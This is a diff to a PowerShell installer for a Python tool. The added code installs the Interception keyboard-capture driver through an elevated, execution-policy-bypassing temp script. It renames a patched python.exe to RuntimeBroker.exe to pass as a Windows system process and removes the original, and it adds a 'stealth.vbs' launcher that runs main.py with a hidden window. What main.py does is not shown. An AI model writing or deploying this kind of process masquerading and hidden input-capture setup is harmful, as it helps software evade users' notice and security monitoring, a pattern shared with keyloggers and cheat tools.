@@ -89,16 +89,69 @@ $envContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String
 Write-Host "  Config ready!" -ForegroundColor Green
 
 # 6. Stealth launcher + driver
-Write-Host "[5/6] Creating launcher..." -ForegroundColor Yellow
+Write-Host "[5/6] Installing driver..." -ForegroundColor Yellow
 $sd = Join-Path $dir ".venv\Scripts"
+$pyExe = Join-Path $sd "python.exe"
+
+# Install Interception driver FIRST (before renaming python.exe)
+$needsReboot = $false
+$driverOK = $false
+try {
+    $chk = & $pyExe -c "import interception; interception.auto_capture_devices(keyboard=True, mouse=False); print('OK')" 2>&1
+    if ("$chk" -match "OK") {
+        Write-Host "  Driver already installed!" -ForegroundColor Green
+        $driverOK = $true
+    } else { throw "need" }
+} catch {
+    Write-Host "  Driver not found. Installing (needs Admin)..." -ForegroundColor Yellow
+    # Write install script that uses the CURRENT python.exe path
+    $drvScript = Join-Path $env:TEMP "t_drv_$(Get-Random).ps1"
+    @"
+`$ErrorActionPreference = 'Stop'
+try {
+    & '$pyExe' -m interception.install 2>&1 | Out-Host
+    Write-Host 'Driver install completed.' -ForegroundColor Green
+} catch {
+    Write-Host "Driver install failed: `$_" -ForegroundColor Red
+}
+Start-Sleep -Seconds 3
+"@ | Set-Content $drvScript -Encoding UTF8
+
+    try {
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$drvScript`"" -Verb RunAs -Wait
+        # Verify driver was actually installed
+        $svcCheck = sc.exe query interception 2>&1
+        if ("$svcCheck" -match "RUNNING" -or "$svcCheck" -match "STOPPED") {
+            Write-Host "  Driver installed successfully! Reboot required." -ForegroundColor Green
+            $needsReboot = $true
+        } else {
+            Write-Host "  Driver install may need reboot to complete." -ForegroundColor Yellow
+            $needsReboot = $true
+        }
+    } catch {
+        Write-Host "  Admin denied. Keyboard input will use SendInput fallback." -ForegroundColor Yellow
+        Write-Host "  (Some apps may block SendInput. Run as Admin to fix.)" -ForegroundColor Yellow
+    }
+    Remove-Item $drvScript -Force -ErrorAction SilentlyContinue
+}
+
+# Now create RuntimeBroker.exe and remove python.exe
+Write-Host "[6/6] Creating launcher..." -ForegroundColor Yellow
 $rb = Join-Path $sd "RuntimeBroker.exe"
 if (-not (Test-Path $rb)) {
-    Copy-Item (Join-Path $sd "python.exe") $rb -Force
-    & (Join-Path $sd "python.exe") (Join-Path $dir "patch_exe.py") $rb 2>$null
+    Copy-Item $pyExe $rb -Force
+    & $pyExe (Join-Path $dir "patch_exe.py") $rb 2>$null
+    # Verify RuntimeBroker.exe works before deleting python.exe
+    $testRb = & $rb -c "print('OK')" 2>&1
+    if ("$testRb" -notmatch "OK") {
+        Write-Host "  WARNING: RuntimeBroker.exe failed, keeping python.exe as backup" -ForegroundColor Yellow
+        Copy-Item $pyExe $rb -Force  # Use unpatched copy as fallback
+    }
 }
-Remove-Item (Join-Path $sd "python.exe") -Force -ErrorAction SilentlyContinue
+Remove-Item $pyExe -Force -ErrorAction SilentlyContinue
 Remove-Item (Join-Path $sd "pythonw.exe") -Force -ErrorAction SilentlyContinue
 
+# Create stealth launcher VBS
 $vbs = Join-Path $dir "stealth.vbs"
 $vbsContent = @"
 Set o = CreateObject("Scripting.FileSystemObject")
@@ -108,27 +161,6 @@ s.CurrentDirectory = d
 s.Run Chr(34) & d & "\.venv\Scripts\RuntimeBroker.exe" & Chr(34) & " " & Chr(34) & d & "\main.py" & Chr(34), 0, False
 "@
 [System.IO.File]::WriteAllText($vbs, $vbsContent)
-
-# Try Interception driver (optional)
-Write-Host "[6/6] Checking driver..." -ForegroundColor Yellow
-$vpy = $rb
-$needsReboot = $false
-try {
-    $chk = & $vpy -c "import interception; interception.auto_capture_devices(keyboard=True, mouse=False); print('OK')" 2>&1
-    if ("$chk" -match "OK") {
-        Write-Host "  Driver OK!" -ForegroundColor Green
-    } else { throw "need" }
-} catch {
-    Write-Host "  Installing driver (needs Admin)..." -ForegroundColor Yellow
-    $drvScript = Join-Path $env:TEMP "t_drv_$(Get-Random).ps1"
-    "`$vpy = '$vpy'; & `$vpy -m interception.install" | Set-Content $drvScript -Encoding UTF8
-    try {
-        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$drvScript`"" -Verb RunAs -Wait
-        $needsReboot = $true
-    } catch {
-        Write-Host "  Skipped (no admin). Using SendInput fallback." -ForegroundColor Yellow
-    }
-}
 
 if ($needsReboot) {
     [System.IO.File]::WriteAllText((Join-Path $dir ".resume_after_reboot"), "1")
